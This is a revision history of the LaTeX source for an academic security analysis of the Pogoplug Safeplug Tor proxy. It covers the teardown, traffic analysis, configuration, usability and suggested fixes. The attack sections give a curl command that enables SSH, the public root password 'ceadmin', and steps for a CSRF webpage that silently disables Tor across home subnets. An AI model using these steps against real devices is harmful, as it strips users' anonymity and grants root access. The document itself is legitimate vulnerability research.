+\begin{figure}[htb]
+\centering
+\begin{subfigure}[b]{.3\textwidth}
+  \includegraphics[width=\textwidth]{safeplug_top}
+  \caption{Top of the board inside the Safeplug device.}
+  \label{fig:top}
+\end{subfigure}%
+\qquad
+\begin{subfigure}[b]{.3\textwidth}
+\includegraphics[width=\textwidth]{safeplug_bottom}
+\caption{Bottom of the board inside the Safeplug device.}
+\label{fig:bottom}
+\end{subfigure}
+\caption{Safeplug circuit board after the teardown.}
+\end{figure}
+
+\subsection{Software}
+\label{software}
+We determined the software on the device from analyzing network traffic logs of the activation process (as described below) and accessing the device via SSH (as described in Section~\ref{sec:SSH}).
+
+\subsubsection{Initial Plugin Behavior}
+Before allowing the Safeplug box to be connected to the outside world, we attached it to a home connection setup formed by a computer with two network cards and then captured traffic both inside that network and between the network and the internet.
+The internal network card was connected to a Netgear switch and served as a gateway, DHCP server, and DNS server.
+The other card was the connection to the internet.
+We used Wireshark to analyze the network data that we captured \cite{wireshark}.
+
+Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: \url{pogoplug.com} and the NIST standardized time.
+The first query for the time was to \url{www.nist.gov}, and subsequent queries included \url{nist1-chi.ustiming.org}, \url{nist1-ny.ustiming.org}, \url{time-nw.nist.gov}, and \url{nist1.symmetricom.com}.
+Queries about pogoplug were mostly for \url{service.pogoplug.com} but after that set was tried \url{secure.pogoplug.com} was attempted once.
+While it was only connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
+
+\subsubsection{Activation and Update Traffic}
+\label{updatetraf}
+After establishing the initial update behavior, we connected the other end of our homemade router back to the internet and captured traffic on both the network interfaces.
+As we had seen previously, the first effort of the Safeplug was to query for \url{service.pogoplug.com} and connect, and the send a POST/XML request to that server containing a 16 byte numerical string of type \verb!nid!, \verb!0x0!
+as \verb!flags!, and a field called \verb!pingdata!
+with length of 423 bytes and undiscernable contents.
+In future work, we hope to explore the contents of this automatic connection with the Pogoplug servers to discover what information is being passed along.
+
+The client computer then navigated to the Pogoplug website to complete the activation processes.
+Each step of the process resulted in both TCP and UDP traffic between the Safeplug box and the pogoplug servers.
+Most interesting was the update step in which the Safeplug box knew to request a script from \url{<update server IP>/svc/upgrade/safeplug\_switch.sh}.
+Since this operation occured over normal HTTP, we were able to use \verb!curl!
+to recover the same script and examine it to discover the contents of the upgrade.
+
+The upgrade script shows (and the network traffic confirms) that the box downloads and installs the following \verb!.tgz! files: 
+\begin{fileName}
+safeplug_lighttpd, safeplug_lighttpd_config, safeplug_wget, safeplug_certs, safeplug_gohelper, safeplug_tor, safeplug_tor_config, safeplug_privoxy, safeplug_privoxy_config
+\end{fileName}
+  Each file is compared to an MD5 hash before being unzipped and installed.
+Details about the software found on the Safeplug are discussed in Section \ref{software}.
+After the two lighttpd installations, a process called \verb!hbplug!
+is killed and lighttpd is started.
+After the certs are downloaded, the current \verb!/usr/local/ssl!
+is overwritten with the new certs.
+The \verb!go\_helper!
+is added to the \verb!/opt/xce/sbin!
+folder, and contains binary files with names related to update and upgrade (which we hope to decompile in future work).
+
+After completing the installations, a default Safeplug configuation file is written with use of Tor set to 1.
+(More information about the configuration in Section \ref{spconfig}.)  Finally, the old \verb!rcS!
+file in \verb!/etc/init.d!
+is replaced with commands to start lighttpd, tor and privoxy, and the LED on the front of the device is set to green after the completion of the upgrade.
+This means that the green LED indicates an up-to-date, internet-connected Safeplug, rather than anything about the use of TOR.
+
+\subsubsection{Traffic After Activation}
+After the activation and the configuration of the Safeplug as a proxy, all traffic was through the Tor network.
+The Safeplug connected to a directory to learn about different relays and seemed to cycle through a small set around the world for different connections.
+This demonstrates that Tor is working as expected.
+If there is any ``phone-home'' being done by the device after Tor has been turned on, then it is doing so through the Tor network.
+
+\subsubsection{Software on the Safeplug}
+As would be suspected from the analysis of the update script described above in Section \ref{updatetraf}, the installed software is in \verb!/opt/xce!
+and includes lighttpd, privoxy, and tor.
+Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
+while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
+Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removnig ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
+Privoxy is also open source.
+All three pieces of software appear to be there with default configuration files (with all appropriate citations and comments present).
+The fourth piece of software discovered on the device, which does not seem to be installed during the activation process is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
+The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.
+
+\subsubsection{Configuration on the Safeplug}
+\label{spconfig}
+The Safeplug configuration files can be found in \verb!/opt/xce/etc!
+and include \verb!sp.conf!
+and \verb!sp_version!
+and \verb!sp_torexceptions!.
+The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exitrelay for the Tor network.
+This is not documented anywhere on the site, so enabling this option would likely require SSH access to discover it, thereby breaking the warranty, but it is interesting that this option is available.
+The version file is likely used for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.
+
+These configuration files are read by the scripts in \verb!/opt/xce/etc/init.d!
+which enable lighttpd, privoxy, and tor.
+As expected, Privoxy looks at the Tor, adblock and exceptions configurations, and Tor reads the \verb!sp.conf!
+file to set which Tor configuration file (regular, relay or exitrelay) to use.

### 2014-02-07 report/discussion.tex
Discussion section and import from old report to new.

@@
 
--does this device have a real market/purpose?
+\subsection{Engineering Fixes}
+The most critical engineering fix is authentication in the POST calls to prevent the cross-site attack.
+A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts, that must be returned by the browser when making the POST request to the RPC server (CITE).
+Although someone doing a cross-site scripting attack such as the one described above could get the cookie sent, if the cookie is set correctly, then the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
 
--did not test on mobile devices
+\subsection{Structural Problems}
+However, there are much more significant structural problems with implementing a Tor connection via an HTTP proxy.
+Several of the usability problems involve user awareness and vigilance.
+For example, cookies and fingerprinting problems mean that users could still be tracked across websites, regardless of whether the ad-block functionality on the Safeplug is enabled.
+This poses an unreasonable stress on users who must be aware of the their browsing practices and does not bode well for the advertised security and anonymity.
+
+One type of client that deserves special attention is a non-Android mobile phone user.
+Although the Tor Project publishes an Android app called Orbot on the Android Market \cite{orbot} which is supported for Android versions 2.3 and later \cite{amorbot}, there are no official Tor apps for iPhones or other non-Android devices.
+Safeplug provides proxy functionality and instructions for Safari on the iPhone; however, this would only work while the user is on that wifi network that the Safeplug routes through.
+If any data is sent over the cellular network or another wifi network, then the security of Tor is lost.
+Additionally, the user may have to disable the proxy whenever they move to a different network, and remember to re-enable it when they want to use Tor.
+This is certainly not transparent usability.
+Users who are truly concerned about anonymity online should eschew the Safeplug and purchase a device that supports the Tor Browser Bundle or other Tor Project software.
+
+\subsection{Opportunities}
+Despite all the structural problems, is there a room or a market for a Torifying piece of hardware?
+Given the security pitfalls in comparison to a piece of software such as the Tor browser bundle, there seems to be no reason for a computer that can run the Tor browser bundle to purchase the Safeplug or any other device.
+For mobile phones, the proxy problems with mobility contribute to an already high usability cost.
+However, there are an emerging classes of ``smart home'' devices which may connect to the internet.
+It is possible that some of these devices can be configured to use an HTTP proxy or some other middle box to Torify their traffic to an external service provider.
+For them, is the benefit of some anonymity via a Safeplug-like device worthwhile?
+Since the data sent by these devices to the service provider likely contains lots of identifying information, the use of Tor probably only protects the user's location at the expense of connection time and load on the Tor network.
+Since proxy configuration on such devices is likely to be difficult and the amount of information hidden is unlikely to be worth the effort, a Torifying box that functions as a proxy has questionable use in this space as well.
+
+Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is not the correct method for security and anonymity online.
+It is critical for Safeplug to correct their engineering errors, particularly the vulnerability to silent disabling of Tor in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.

### 2014-02-07 report/implementattacks.tex
Discussion section and import from old report to new.

--- 2014-02-04 report/implementattacks.tex
@@
 
-\subsection{Gaining Access through SSH}
+As we discovered during the software analysis, the Safeplug has a remote procedure call (RPC) capability.
+This is a script called \verb!xspctrl!
+found in \verb!/opt/xce/html/svc!
+and it contains various options.
+Particularly, functional calls to this script include enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
+None of them require any arguments in the POST string.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=.75\textwidth]{disabletor}
+\caption{Disabling Tor as an insider attack.}
+\label{disable}
+\end{center}
+\end{figure}
 
 \subsection{Insider Attack}
+Since the RPC server does not perform any kind of validation or authentication on the settings strings, it would be easy for anyone inside the local network to send a command and change the settings, for example to disable Tor or adblocking.
+All the attacker would need to know is the IP of the device.
+It does not even require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
+Figure \ref{disable} shows an example of this attack.
+
+This attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
+The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
+It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access make a disabling RPC call into the Safeplug.
+This would occur silently from the perspective of a client unless the happen to check the Settings page for the Safeplug.
+Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
+
+This seems like a fairly important vulnerability and requires action from Pogoplug to fix.
+Since the purpose of these RPC operations is unclear without access to more of the source code, it is possible that they could be disabled entirely.
+If not, perhaps there is some authentication protocol that could be implemented.
+The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would be a poor experience.
 
@@
 \begin{enumerate}
-\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: http://$<$IP address$>$/svc/xspctrl/disableTor (See Appendix A).
+\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: \url{http://<IP address>/svc/xspctrl/disableTor} (See Appendix \ref{App:AppendixA}).
 \item Send the malicious link to a user in the targeted private network.
@@
 (Removal of a webpage from the whitelist is likely to to cause usability problems and be more evident.)
+
+\subsection{Gaining Access through SSH}
+\label{sec:SSH}
+    \subsubsection{Accessing the Device}
+    Safeplug runs an RPC server that allows the enabling of SSH access via HTTP.
+SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same (although the Pogoplug support staff note that SSH access breaks the warranty!) \cite{ceadmin}:
+\begin{fileName}
+curl --data ``'' http://<IP-of-Safeplug>/svc/xspctrl/enableSSHD
+ssh root@<IP-of-Safeplug>
+password: ceadmin
+\end{fileName}
+
+Obviously having a publically available root password means that SSH can be done effectively without authentication.
+We tried the SSH procedure twice, once before the internet connection and activation, and once afterwards.
+Before the activation and update procedure, SSH was not available.
+The simple \verb!Hbplug!
+software on the box could not accept this RPC call.
+However, once the box was updated and had lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.

### 2014-02-07 report/resultsSoftware.tex
Discussion section and import from old report to new.

--- 2014-01-14 resultsSoftware.tex
@@
 \subsubsection{Website Attack}
-We think it is also possible that an external website could perform this attack by returning the correctly formatted POST string.  Setting this up is future work.
+An external website can also perform this attack by returning a correctly formatted POST string.
+This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
+Instead, the attacker (who could be any malicious actor with access to a web server) can just send a POST request to every IP in the common ranges of local addresses in home networks, 192.168.0.0/24 and 192.168.1.0/24.
+We implemented this attack with less than 30 lines of Javascript code (See Appendix A).
+The following steps are necessary for the attack to be successful:
+
+\begin{enumerate}
+\item Set up a web page with the crafted Javascript code, which will send a POST request of the following format to all addresses in the range: http://$<$IP address$>$/svc/xspctrl/disableTor (See Appendix A).
+\item Send the malicious link to a user in the targeted private network.
+\item Once the user clicks the link and loads the malicious site, the correctly formatted POST request will be sent to every IP address in the ranges.  
+\item Tor is disabled silently.  The user must check or refresh her settings page to learn that Tor is turned off.  
+\end{enumerate}
+
+This exploits the RPC server in the same manner that the Insider Attack does.
+While this attack requires a greater amount of time because the local IP address of the Safeplug must be guessed via search, but the number of private address spaces is small, and the space likely to be occupied by a Safeplug on a home network is even smaller.
+
+The largest observed time to send requests to the 192.168.0.0/24 space was ~400 milliseconds; the entire attack costs ~800 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
+In the case of a private network in the range of 172.16.0.0/16, the attack took less than ~12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).
+This means that it would take a few hours to send requests to the full 172.16.0.0/12 range, which is commonly used in business networks.
+The final private network space is 10.0.0.0/8 which is too large for an exhaustive search, but some simple optimization might make it feasible as well.
+For example, using a GET request to get and parse the Safeplug settings page would allow the script to positively identify the safeplug and stop the search.
+However, the 192.168.0.0/24 and 192.168.1.0/24 ranges are much more common in home networks; because Safeplug is geared towards home network use, in most cases the script will take less than a second, a trivial amount of time for the attacker to spend.
+
+In addition to disabling Tor, the attacker can modify any other settings on the device.
+This includes: enabling/disabling Tor, enabling/disabling ad-blocking, enabling/disabling the use of the device as a Tor relay node [note: this requires the user to do additional setup], enabling/disabling the use of the device as an exit node (if it is already a relay).
+Lastly, the attacker can also modify the user's whitelist of sites that should not be routed through Tor.
+This whitelist attack is particularly dangerous because the change is silent and much harder for the user to notice the addition of a single website to the whitelist than a global loss of Tor.
+(Removal of a webpage from the whitelist is likely to to cause usability problems and be more evident.)

### 2014-02-07 report/usability.tex
Discussion section and import from old report to new.

@@
 This page is shown in Figure~\ref{fig:settings}.
-This allowed us to turn on/off Tor, add whitelisted websites, turn on/off ad-blocking, and turn on/off the ability of our device to be a relay node.
+This allowed us to turn on/off Tor, add white-listed websites, turn on/off ad-blocking, and turn on/off the ability of our device to be a relay node.
 
@@
 Next, we wanted to see how usable this would be to a normal Internet user.
-A user would probably decide not to use Safeplug if they couldn't read their web pages (if they weren't in their native language), or if they couldn't log into their accounts (some web sites will lock a user out if they try to login from multiple countries in a short time period).
+A user would probably decide not to use Safeplug if they could not read their web pages (if they were not in their native language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).
 While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.
@@
 This is clearly not the perfect ``anonymity'' that Safeplug promised in their publicity.
-Although normal use does follow this model of persisting logins across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (German vs Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
+Although normal use does follow this model of persisting logged in status across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (German vs Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
 

### 2014-02-08 report/bibliography.tex
finished related work and added items to bibliography

@@
 
-\bibitem{amorbot} The Tor Project. ``Orbot: Proxy with Tor.'' \emph{Google Android Market}. Accessed 7 February 2014, \url{https://play.google.com/store/apps/details?id=org.torproject.android}
+\bibitem{dyer} Dyer, Kevin P., Coull, Scott E., Ristenpart, Thomas, and Shrimpton, Thomas.
+``Peek-a-boo, i still see you: Why efficient traffic analysis countermeasures fail.'' \emph{In Proceedings of the 33rd Annual IEEE Symposium on Security and Privacy}, 2012.
+
+\bibitem{feamster} Feamster, Nick, and Dingledine, Roger.  ``Location Diversity in Anonymity Networks.''  \emph{In ACM Workshop on Privacy in the Electronic Society (WPES)}, 2004.
+
+\bibitem{fredrikson} Fredrikson, M., and Livshits, B. ``Repriv: Re-envisioning in-browser privacy.'' \emph{In Proceedings of the 2011 IEEE Symposium on Security and Privacy}, May 2011.
+
+\bibitem{guha} Guha, S., Cheng, B., and Francis, P.
+``Privad: Practical privacy in online advertising.'' \emph{In Proceedings of the 2011 USENIX Symposium on Networked Systems Design and Implementation}, April 2011.
 
 \bibitem{bittech} Halfacree, Gareth. ``Pogoplug launches Tor-powered Safeplug'' \emph{bit-tech.net} 25 November 2013, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.
+
+\bibitem{herrmann} Herrmann, Dominik, Wendolsky, Rolf, and Federrath, Hannes.
+``Website fingerprinting: attacking popular privacy enhancing technologies with the multinomial naive-bayes classifier.'' \emph{In Proceedings of the 2009 ACM workshop on Cloud computing security}.
 
@@
 
-\bibitem{commercial1} Nikiforakis, Nick, et al. "Cookieless monster: Exploring the ecosystem of web-based device fingerprinting." IEEE Symposium on Security and Privacy. 2013.
+\bibitem{murdoch} Murdoch, S.J., Danezis, G.  ``Low-Cost Traffic Analysis of Tor.'' \emph{In IEEE Symposium on Security and Privacy (Oakland)}, 2005.
 
-\bibitem{orbot} ``Tor on Android.'' \emph{Tor Project.} Accessed February 2014. \url{https://torproject.org/docs/android.html.en}
+\bibitem{murdoch2} Murdoch, S.J. and Zielinski, P.  ``Sampled Traffic Analysis by Internet-Exchange-Level Adversaries.'' \emph{In Privacy Enhancing Technologies (PET)}, 2007.
+
+\bibitem{overlier} Overlier, L. and Syverson, P.  ``Locating Hidden Servers.'' \emph{In IEEE Symposium on Security and Privacy (Oakland)}, 2006.
+
+\bibitem{panchenko} Panchenko, Andriy, Niessen, Lukas, Zinnen, Andreas, and Engel, Thomas.
+``Website fingerprinting in onion routing based anonymization networks.'' \emph{In Proceedings of the 10th Workshop on Privacy in the Electronic Society}, 2011.
 
@@
 
+\bibitem{toubiana} Toubiana, V., Narayanan, A., Boneh, D., Nissenbaum, H., and Barocas, S.
+``Adnostic: Privacy preserving targeted advertising.'' \emph{In Proceedings of the 2010 Network and Distributed System Security Symposium}, March 2010.
+
 \bibitem{wired} Solon, Olivia.
@@
 
-\bibitem{torproject} Tor Project.  \url{https://www.torproject.org/}.
+\bibitem{orbot} ``Tor on Android.'' \emph{Tor Project.} Accessed February 2014. \url{https://torproject.org/docs/android.html.en}
+
+\bibitem{torproject} The Tor Project.  \url{https://www.torproject.org/}.
+
+\bibitem{amorbot} The Tor Project. ``Orbot: Proxy with Tor.'' \emph{Google Android Market}. Accessed 7 February 2014, \url{https://play.google.com/store/apps/details?id=org.torproject.android}
 

### 2014-02-08 report/related.tex
added TODO items in paper
finished related work and added items to bibliography

--- 2014-01-14 related.tex
@@
 
-{\bf Tor.} There has been previous research analyzing Tor and evaluating Tor's security against realistic adversaries~\cite{tor2}.
-Specifically, research has shown that it is possible to deanonymize users that use Tor.
-Safeplug does not modify Tor, it simply uses it.
-Despite warnings on the Tor project website that state no other configurations are guaranteed to make a user anonymous, except for the Tor Browser Bundle~\cite{torproject}.
+To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.
+However there has been much prior research on the primary technology that the device uses: Tor.
+Additionally, the security goals that Safeplug attempts to achieve have been previously studied in great detail; these include fingerprinting and cookies.
 
-{\bf Fingerprinting.}  Prior research has shown privacy attacks based on fingerprinting physical devices as well as through traffic analysis~\cite{fingerprint1, fingerprint2}.
-We used Panopticlick to determine how unique our browser fingerprint is, and it was determined to be unique, despite Safeplug's anonymity guarantees~\cite{pano}.
+{\bf Tor.} Prior security evaluations of the Tor network reveal a myriad of potential vulnerabilities.
+A significant area of research on Tor relates to diversity of autonomous systems (ASes).
+Feamster and Dingledine argue that a user's anonymity may be compromised by using geographically diverse ASes; when analyzing both sides of an anonymous path, it is more likely the same AS will appear in both sides of a long path than in a short path~\cite{feamster}.
+Murdoch and Zielinski also argue against AS diversity.
+They state that AS diversity does not improve security because traffic is routed through ASes at Internet exchange points (IXPs); therefore, an IXP can observe traffic that passes through multiple ASes~\cite{murdoch2}.
+There has also been proven traffic correlation attacks that are efficient on the Tor network~\cite{murdoch, overlier}.
+Johnson, Wacek, Jansen, Sherr, and Syverson evaluated Tor's security against reasonably realistic adversaries and contribute metrics that model security over time.
+They found that in a period of six months, 80\% of all users may be deanonymized by a reasonably realistic Tor-relay adversary.
+Johnson et al.
+take into account how the Tor network evolves over time when evaluating Tor's security~\cite{tor2}.
+While Safeplug does not introduce or modify how Tor is used, it routes all traffic through the Tor network; Safeplug is also vulnerable to the attacks found in prior research on Tor.
 
-{\bf Third-party and Supercookies.} Cookies and web tracking have been popular research areas lately.  Some related work regards user privacy leaks based on cookies~\cite{commercial1, commercial2}.
+{\bf Fingerprinting.}  Website fingerprinting attacks as well as remote physical device fingerprinting attacks have shown they can identify users, even when specific defense have been used in order to prevent these attacks.
+Previous research has shown that web page fingerprinting attacks are possible~\cite{dyer, herrmann, panchenko}.
+Cai, Zhang, Joshi, and Johnson introduced both a web page and website fingerprinting attack that defeats many recently proposed defenses, including cover traffic and randomized pipeling.
+They find that their attack is successful 83.7\% of the time when the defense is the use of Tor; the success rate decreases to 52.2\% when the defense is the use of Tor, randomized pipelining, padding packets to 1500 bytes, and adding cover traffic at a 1:1 ratio~\cite{fingerprint1}.
+These results can be extended to the security of Safeplug.
+Because Safeplug uses only Tor to anonymize users, it may be susceptible to this fingerprinting attack.
+
+{\bf Cookies} There has been much policy and technology debate around the topic of third-party web tracking.
+Mayer and Mitchell survey recent policy and technology stances on web tracking; while tracking allows for free web content and innovation, it compromises a user's privacy~\cite{commercial2}.
+They discuss the existence and use of stateful tracking by using ``supercookies.''  While many companies use cookies, there has also been work in developing privacy-preserving third-party services, such as Privad, Adnostic, and RePriv~\cite{guha, toubiana, fredrikson}.

### 2014-02-08 report/design.tex
updated hardware figures

@@
 Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
-We identified an SD card slot, Lan transformer, and Ethernet transceiver on the top of the board.
-On the bottom, we found flash memory and the integrated circuit.
+The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ??, (F) ??, (G) an integrated circuit, and (H), (I) flash memory.
 
@@
 \begin{subfigure}[b]{.3\textwidth}
-  \includegraphics[width=\textwidth]{safeplug_top}
+  \includegraphics[width=\textwidth]{safeplug_listed_top}
   \caption{Top of the board inside the Safeplug device.}
@@
 \begin{subfigure}[b]{.3\textwidth}
-\includegraphics[width=\textwidth]{safeplug_bottom}
+\includegraphics[width=\textwidth]{safeplug_listed_bottom}
 \caption{Bottom of the board inside the Safeplug device.}

### 2014-02-11 report/design.tex
made minor edits

@@
 \subsection{Hardware}
-We opened up the Safeplug device to look at the internals.
+Before investigating the software, we took apart one of the two Safeplug devices we purchased in order to see the physical components.
 Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
-The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ??, (F) ??, (G) an integrated circuit, and (H), (I) flash memory.
+The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) an integrated circuit, and (H), (I) flash memory.
 
@@
 \label{software}
-We determined the software on the device from analyzing network traffic logs of the activation process (as described below) and accessing the device via SSH (as described in Section~\ref{sec:SSH}).
+We determined the software on the device from analyzing network traffic logs of the activation process and accessing the device via SSH.
 
@@
 
-Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: \url{pogoplug.com} and the NIST standardized time.
+Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: the NIST standardized time and \url{pogoplug.com}.
 The first query for the time was to \url{www.nist.gov}, and subsequent queries included \url{nist1-chi.ustiming.org}, \url{nist1-ny.ustiming.org}, \url{time-nw.nist.gov}, and \url{nist1.symmetricom.com}.
-Queries about pogoplug were mostly for \url{service.pogoplug.com} but after that set was tried \url{secure.pogoplug.com} was attempted once.
-While it was only connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
+Queries about pogoplug were mostly for \url{service.pogoplug.com}, but \url{secure.pogoplug.com} was attempted once.
+While it was connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
 
@@
 \label{updatetraf}
-After establishing the initial update behavior, we connected the other end of our homemade router back to the internet and captured traffic on both the network interfaces.
-As we had seen previously, the first effort of the Safeplug was to query for \url{service.pogoplug.com} and connect, and the send a POST/XML request to that server containing a 16 byte numerical string of type \verb!nid!, \verb!0x0!
+After establishing the initial update behavior, we connected the other end of our router back to the internet and captured traffic on both of the network interfaces.
+As we had seen previously, the first effort of the Safeplug was to query for \url{service.pogoplug.com} and connect, and then send a POST/XML request to that server containing a 16 byte numerical string of type \verb!nid!, \verb!0x0!
 as \verb!flags!, and a field called \verb!pingdata!
 with length of 423 bytes and undiscernable contents.
-In future work, we hope to explore the contents of this automatic connection with the Pogoplug servers to discover what information is being passed along.
 
-The client computer then navigated to the Pogoplug website to complete the activation processes.
-Each step of the process resulted in both TCP and UDP traffic between the Safeplug box and the pogoplug servers.
+The client computer then navigated to the Pogoplug website to complete the activation process.
+Each step of the process resulted in both TCP and UDP traffic between the Safeplug box and the Pogoplug servers.
 Most interesting was the update step in which the Safeplug box knew to request a script from \url{<update server IP>/svc/upgrade/safeplug\_switch.sh}.
@@
 Details about the software found on the Safeplug are discussed in Section \ref{software}.
-After the two lighttpd installations, a process called \verb!hbplug!
+After the safeplug\_lighttpd and safeplug\_lighttpd\_config installations, a process called \verb!hbplug!
 is killed and lighttpd is started.
@@
 is added to the \verb!/opt/xce/sbin!
-folder, and contains binary files with names related to update and upgrade (which we hope to decompile in future work).
+folder, and contains binary files with names related to update and upgrade.
 
 After completing the installations, a default Safeplug configuation file is written with use of Tor set to 1.
-(More information about the configuration in Section \ref{spconfig}.)  Finally, the old \verb!rcS!
+More information about the configuration is in Section \ref{spconfig}.
+Finally, the old \verb!rcS!
 file in \verb!/etc/init.d!
@@
 \subsubsection{Traffic After Activation}
-After the activation and the configuration of the Safeplug as a proxy, all traffic was through the Tor network.
+After the activation and the configuration of the Safeplug as a proxy, all traffic runs through the Tor network.
 The Safeplug connected to a directory to learn about different relays and seemed to cycle through a small set around the world for different connections.
@@
 while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
-Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removnig ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
+Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removing ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
 Privoxy is also open source.
-All three pieces of software appear to be there with default configuration files (with all appropriate citations and comments present).
+All three pieces of software appear to have default configuration files.
 The fourth piece of software discovered on the device, which does not seem to be installed during the activation process is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
@@
 and \verb!sp_torexceptions!.
-The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exitrelay for the Tor network.
+The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exit relay for the Tor network.
 This is not documented anywhere on the site, so enabling this option would likely require SSH access to discover it, thereby breaking the warranty, but it is interesting that this option is available.
@@
 As expected, Privoxy looks at the Tor, adblock and exceptions configurations, and Tor reads the \verb!sp.conf!
-file to set which Tor configuration file (regular, relay or exitrelay) to use.
+file to set which Tor configuration file (regular, relay or exit relay) to use.

### 2014-02-11 report/discussion.tex
made minor edits

@@
 \subsection{Engineering Fixes}
-The most critical engineering fix is authentication in the POST calls to prevent the cross-site attack.
-A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts, that must be returned by the browser when making the POST request to the RPC server (CITE).
-Although someone doing a cross-site scripting attack such as the one described above could get the cookie sent, if the cookie is set correctly, then the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
+The most critical engineering fix is authentication in the POST calls to prevent the cross-site request forgery attack.
+A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server (CITE).
+Although someone doing a cross-site request forgery attack such as the one described above could get the cookie sent, if the cookie is set correctly, then the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
 
@@
 For example, cookies and fingerprinting problems mean that users could still be tracked across websites, regardless of whether the ad-block functionality on the Safeplug is enabled.
-This poses an unreasonable stress on users who must be aware of the their browsing practices and does not bode well for the advertised security and anonymity.
+This poses an unreasonable stress on users who must be aware of their browsing practices and does not bode well for the advertised security and anonymity.
 
@@
 \subsection{Opportunities}
-Despite all the structural problems, is there a room or a market for a Torifying piece of hardware?
-Given the security pitfalls in comparison to a piece of software such as the Tor browser bundle, there seems to be no reason for a computer that can run the Tor browser bundle to purchase the Safeplug or any other device.
+Despite all the structural problems, is there a market for a Torifying piece of hardware?
+Given the security pitfalls in comparison to a piece of software such as the Tor browser bundle, there seems to be no reason for a user that can run the Tor browser bundle to purchase the Safeplug or any other device.
 For mobile phones, the proxy problems with mobility contribute to an already high usability cost.
-However, there are an emerging classes of ``smart home'' devices which may connect to the internet.
+However, there are an emerging class of ``smart home'' devices which may connect to the internet.
 It is possible that some of these devices can be configured to use an HTTP proxy or some other middle box to Torify their traffic to an external service provider.

### 2014-02-11 report/implementattacks.tex
made minor edits

@@
 The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
-It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access make a disabling RPC call into the Safeplug.
-This would occur silently from the perspective of a client unless the happen to check the Settings page for the Safeplug.
+It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access to make a disabling RPC call into the Safeplug.
